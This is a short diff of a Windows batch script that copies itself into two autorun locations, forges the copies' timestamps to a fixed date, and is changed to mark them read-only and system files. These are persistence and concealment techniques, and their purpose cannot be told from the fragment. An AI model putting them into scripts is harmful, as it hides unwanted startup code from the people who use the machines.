@@ -99,12 +99,12 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 if exist "%path_autoRun1%\%~nx0" (
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
-  rem attrib +h +r +s "%path_autoRun1%\%~nx0"
+  attrib +r +s "%path_autoRun1%\%~nx0"
 ) else copy /y "%~dpnx0" "%path_autoRun1%\"
 
 if exist "%path_autoRun2%\%~nx0" (
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
-  rem attrib +h +r +s "%path_autoRun2%\%~nx0"
+  attrib +r +s "%path_autoRun2%\%~nx0"
 ) else copy /y "%~dpnx0" "%path_autoRun2%\"
 
 
